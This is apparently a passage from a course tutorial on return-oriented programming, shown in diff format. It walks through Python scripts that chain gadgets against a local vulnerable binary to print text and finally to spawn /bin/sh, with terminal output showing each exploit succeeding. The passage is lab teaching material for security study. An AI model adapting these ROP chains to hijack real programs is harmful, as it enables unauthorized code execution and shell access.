+Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAz`F?
+                                                                                                                        AAAAﾭ?zaﾭ޾???
+Segmentation fault (core dumped)
+user@si485H-base:demo$ dmesg | tail -1
+[1560517.099344] vulnerable[10793]: segfault at cafebabe ip cafebabe sp bffff64c error 15
+</pre>
+</div>
+</div>
+</div>
+
+
+<div id="outline-container-orgheadline12" class="outline-2">
+<h2 id="orgheadline12"><span class="section-number-2">3</span> Completing the Exploit</h2>
+<div class="outline-text-2" id="text-3">
+<p>
+Now that you've seen what the game is like, we can finish this exploit
+and write an 'A' to stdout. At this point it is only a matter of
+finding the right gadgets:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ cat print_A_rop.py
+#!/usr/bin/python
+
+from struct import pack
+
+p = '+'*(0x70) #padding
+
+#Write an A to 0x080ea060
+p += pack('&lt;I', 0x0806e97a) #pop edx; ret
+p += pack('&lt;I', 0x080ea060) #address to write to
+p += pack('&lt;I', 0x080bb746) #pop eax; ret
+p += pack('&lt;I', 0x41414141) #'AAAA'
+p += pack('&lt;I', 0x0808fc26) # mov [edx],eax;pop ebx;ret
+p += pack('&lt;I', 0xdeadbeef) #  filler for pop ebx, will be adjust to 0x01 below
+
+#Set eax to 0x4 and ebx to 0x1
+p += pack('&lt;I', 0x080584a6) # : xor eax, eax ; pop ebx ; ret
+p += pack('&lt;I', 0xffffffff)# set ebx to 0xfffffff
+p += pack('&lt;I', 0x080e2593) #: add al, 2 ; inc ebx ; ret (ebx=0xffffffff+1 = 0x00000000)
+p += pack('&lt;I', 0x080e2593) #: add al, 2 ; inc ebx ; ret (ebx=0x00000000+1 = 0x00000001)
+
+#Set ecx to 0x080ea060
+p += pack('&lt;I', 0x080e4c5d) # pop ecx ; ret
+p += pack('&lt;I', 0x080ea060) #address of AAAA
+
+
+#set edx to 0x1
+p += pack('&lt;I', 0x0806e97a)# pop edx ; ret
+p += pack('&lt;I', 0xffffffff)# set edx to 0xfffffff
+p += pack('&lt;I', 0x0805d0e7)# : inc edx ; ret
+p += pack('&lt;I', 0x0805d0e7)# : inc edx ; ret (now edx is 0x1)
+
+#call interupt
+p += pack('&lt;I', 0x0806f040) # int 0x80; ret
+
+p += pack('&lt;I', 0xcafebabe) # &lt;-- segfault here
+
+print p
+</pre>
+
+<p>
+And then we can run it:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./vulnerable `python print_A_rop.py`
+Buf: ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++z`F?
+                                                                                                                        AAAAﾭަ??????]`z??????@????
+ASegmentation fault (core dumped)
+user@si485H-base:demo$ dmesg | tail -1
+[1564247.938610] vulnerable[11157]: segfault at cafebabe ip cafebabe sp bffff654 error 15
+</pre>
+
+<p>
+And you see, there's our A!
+</p>
+</div>
+
+<div id="outline-container-orgheadline10" class="outline-3">
+<h3 id="orgheadline10"><span class="section-number-3">3.1</span> Printing a Sequence of Chars</h3>
+<div class="outline-text-3" id="text-3-1">
+<p>
+Now that we can print an "A", let's try and print something a bit more
+exciting, like "Go Navy"` At this point, we have successfully created
+the string we are going to write, the next thing we need is to be able
+set up the remainder of the registers or call a function that can
+print to the screen.
+</p>
+
+<p>
+The cool thing is now that we have the infrastructure, we can just
+make functions out of these. That is, we can make a function that
+produces a ROP chain that does our task, and then we can just chain
+those together:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ cat print_string_rop.py
+#!/usr/bin/python
+
+import sys
+from struct import pack
+
+#write a char to memory
+def write_char(a):
+    p = ""
+    #Write a to 0x080ea060
+    p += pack('&lt;I', 0x0806e97a) #pop edx; ret
+    p += pack('&lt;I', 0x080ea060) #address to write to
+    p += pack('&lt;I', 0x080bb746) #pop eax; ret
+    p += pack('&lt;I', a) # character we want to print
+    p += pack('&lt;I', 0x0808fc26) # mov [edx],eax;pop ebx;ret
+    p += pack('&lt;I', 0xdeadbeef) #  filler for pop ebx, will be adjust to 0x01 below
+    return p
+
+#write a space to memory
+def write_space():
+    p = ""
+    #Write a to 0x080ea060
+    p += pack('&lt;I', 0x0806e97a) #pop edx; ret
+    p += pack('&lt;I', 0x080ea060) #address to write to
+    p += pack('&lt;I', 0x080bb746) #pop eax; ret
+    p += pack('&lt;I', 0x1f1f1f1f) # write byte one less than 0x20 for space
+    p += pack('&lt;I', 0x0807b466) # inc eax ; ret (turns least significant byte to 0x20)
+    p += pack('&lt;I', 0x0808fc26) # mov [edx],eax;pop ebx;ret
+    p += pack('&lt;I', 0xdeadbeef) #  filler for pop ebx, will be adjust to 0x01 below
+    return p
+
+#write a newline to memory
+def write_newline():
+    p = ""
+    #Write a to 0x080ea060
+    p += pack('&lt;I', 0x0806e97a) #pop edx; ret
+    p += pack('&lt;I', 0x080ea060) #address to write to
+    p += pack('&lt;I', 0x080584a6) # : xor eax, eax ; pop ebx ; ret
+    p += pack('&lt;I', 0xdeadbeef) # filler for pop ebx
+    p += pack('&lt;I', 0x0807b466) # inc eax 
+    p += pack('&lt;I', 0x0807b466) # inc eax 
+    p += pack('&lt;I', 0x0807b466) # inc eax 
+    p += pack('&lt;I', 0x0807b466) # inc eax 
+    p += pack('&lt;I', 0x0807b466) # inc eax 
+    p += pack('&lt;I', 0x0807b466) # inc eax 
+    p += pack('&lt;I', 0x0807b466) # inc eax 
+    p += pack('&lt;I', 0x0807b466) # inc eax 
+    p += pack('&lt;I', 0x0807b466) # inc eax 
+    p += pack('&lt;I', 0x0807b466) # inc eax 
+    p += pack('&lt;I', 0x0808fc26) # mov [edx],eax;pop ebx;ret
+    p += pack('&lt;I', 0xdeadbeef) #  filler for pop ebx
+    return p
+    
+
+#print the char in memory to the screen
+def print_char():
+    p = ""
+    #Set eax to 0x4 and ebx to 0x1
+    p += pack('&lt;I', 0x080584a6) # : xor eax, eax ; pop ebx ; ret
+    p += pack('&lt;I', 0xffffffff)# set ebx to 0xfffffff
+    p += pack('&lt;I', 0x080e2593) #: add al, 2 ; inc ebx ; ret (ebx=0xffffffff+1 = 0x00000000)
+    p += pack('&lt;I', 0x080e2593) #: add al, 2 ; inc ebx ; ret (ebx=0x00000000+1 = 0x00000001)
+    
+    #Set ecx to 0x080ea060
+    p += pack('&lt;I', 0x080e4c5d) # pop ecx ; ret
+    p += pack('&lt;I', 0x080ea060) #address of AAAA
+
+
+    #set edx to 0x1
+    p += pack('&lt;I', 0x0806e97a)# pop edx ; ret
+    p += pack('&lt;I', 0xffffffff)# set edx to 0xfffffff
+    p += pack('&lt;I', 0x0805d0e7)# : inc edx ; ret
+    p += pack('&lt;I', 0x0805d0e7)# : inc edx ; ret (now edx is 0x1)
+
+    #call interupt
+    p += pack('&lt;I', 0x0806f040) # int 0x80; ret
+    return p
+
+
+#convert a char to 0xXXXXXXX number
+def dub_char(s):
+    r = ord(s[0])
+    r = r | r &lt;&lt; 8 | r &lt;&lt; 16 | r &lt;&lt; 24
+    return r
+
+if __name__ == "__main__":
+    p = '+'*(0x70) #padding
+    
+    for c in sys.argv[1]:
+        if ord(c) == 0x20:
+            p += write_space()
+        else:
+            p += write_char(dub_char(c))
+
+        p += print_char()
+
+    p += write_newline()
+    p += print_char()
+
+    p += pack('&lt;I', 0xcafebabe) # &lt;-- segfault here
+        
+    print p
+</pre>
+<p>
+And it works:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./vulnerable `python print_string_rop.py "Go Navy, Beat Army!"`
+Buf: ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++z`F?
+                                                                                                                        GGGGﾭަ??????]`z??????@z`F?
+                                                                                                                                                ooooﾭަ??????]`z??????@z`F?
+                                                                                                                                                                        fﾭަ??????]`z??????@z`F?
+                                                                                                                                                                                             NNNNﾭަ??????]??????@z`F?
+        aaaaﾭަ??????]`z??????@z`F?
+                                vvvvﾭަ??????]`z??????@z`F?
+                                                        yyyyﾭަ??????]`z??????@z`F?
+                                                                                ,,,,ﾭަ??????]`z??????@z`F?
+                                                                                                        fﾭަ??????]`z??????@z`F?
+                                                                                                                             BBBBﾭަ??????]`z??????@z`F?
+                                                                                                                                                     eeeeﾭަ??????]`z??????@z`F?
+                                                                                                                                                                             aaaaﾭަ??????]`z??????@z`F?
+                                                                                                                                                                                                     tttﾭަ??????]`z??????@z`F?
+                 fﾭަ??????]`z??????@z`F?
+                                      AAAAﾭަ??????]`z??????@z`F?
+                                                              rrrrﾭަ??????]`z??????@z`F?
+                                                                                      mmmmﾭަ??????]`z??????@z`F?
+                                                                                                              yyyyﾭަ??????]`z??????@z`F?
+                                                                                                                                      !!!!ﾭަ??????]`z??????@z`?ﾭ?ffffffffffﾭަ??????]`z??????@????
+Go Navy, Beat Army!
+Segmentation fault (core dumped)
+user@si485H-base:demo$ dmesg | tail -1
+[1565900.040307] vulnerable[11345]: segfault at cafebabe ip cafebabe sp bffff654 error 15
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orgheadline11" class="outline-3">
+<h3 id="orgheadline11"><span class="section-number-3">3.2</span> Launching a shell</h3>
+<div class="outline-text-3" id="text-3-2">
+<p>
+We actually have everything we need to also launch a shell. It is the
+same as writing an 'A' but now we also have to set up the other
+registers slightly differently. Recall, this is what we need:
+</p>
+
+<ul class="org-ul">
+<li>eax : 0xb</li>
+<li>ebx : address of the string "/bin/sh\0"</li>
+<li>ecx : 0x0</li>
+<li>edx : 0x0</li>
+</ul>
+
+<p>
+We can do that.
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ cat shell_rop.py
+from struct import pack
+
+p = '+'*(0x70) #padding
+
+#Write an /bin to 0x080ea060
+p += pack('&lt;I', 0x0806e97a) #pop edx; ret
+p += pack('&lt;I', 0x080ea060) #address to write to
+p += pack('&lt;I', 0x080bb746) #pop eax; ret
+p += "/bin" # bin
+p += pack('&lt;I', 0x0808fc26) # mov [edx],eax;pop ebx;ret
+p += pack('&lt;I', 0xdeadbeef) #  filler for pop ebx, will be adjust to 0x01 below
+
+#Write an //sh 0x080ea064
+p += pack('&lt;I', 0x0806e97a) #pop edx; ret
+p += pack('&lt;I', 0x080ea064) #address to write to
+p += pack('&lt;I', 0x080bb746) #pop eax; ret
+p += "//sh" # bin
+p += pack('&lt;I', 0x0808fc26) # mov [edx],eax;pop ebx;ret
+p += pack('&lt;I', 0xdeadbeef) #  filler for pop ebx, will be adjust to 0x01 below
+
+
+#Set eax to 0xb and ebx to 0x080ea060
+p += pack('&lt;I', 0x080584a6) # : xor eax, eax ; pop ebx ; ret
+p += pack('&lt;I', 0x080ea060) #address of "/bin/sh"
+p += pack('&lt;I', 0x0807b466) # inc eax (1)
+p += pack('&lt;I', 0x0807b466) # inc eax (2)
+p += pack('&lt;I', 0x0807b466) # inc eax (3)
+p += pack('&lt;I', 0x0807b466) # inc eax (4)
+p += pack('&lt;I', 0x0807b466) # inc eax (5)
+p += pack('&lt;I', 0x0807b466) # inc eax (6)
+p += pack('&lt;I', 0x0807b466) # inc eax (7)
+p += pack('&lt;I', 0x0807b466) # inc eax (8) 
+p += pack('&lt;I', 0x0807b466) # inc eax (9)
+p += pack('&lt;I', 0x0807b466) # inc eax (a)
+p += pack('&lt;I', 0x0807b466) # inc eax (b)
+
+#Set ecx to 0
+p += pack('&lt;I', 0x080e4c5d) # : pop ecx ; ret
+p += pack('&lt;I', 0xffffffff) # value for ecx
+p += pack('&lt;I', 0x080daa6c) # : inc ecx ; ret (ecx now zero)
+
+
+#Set edx to 0
+
+p += pack('&lt;I', 0x0806e97a)# pop edx ; ret
+p += pack('&lt;I', 0xffffffff)# set edx to 0xfffffff
+p += pack('&lt;I', 0x0805d0e7)# : inc edx ; ret
+
+#call interupt
+p += pack('&lt;I', 0x0806f040) # int 0x80; ret
+
+print p
+</pre>
+
+<pre class="example">
+user@si485H-base:demo$ ./vulnerable `python shell_rop.py`
+Buf: ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++z`F?
+                                                                                                                        /binﾭ?zdF?
+z?????@?                                                                                                                         //shﾭަ`fffffffffff]????l?
+$ echo "Go Navy, Beat Army!"
+Go Navy, Beat Army!
+$
+</pre>
+
+
+<p>
+THE END!
+</p>
+</div>
+</div>
+</div>
+</div>
+</body>
+</html>
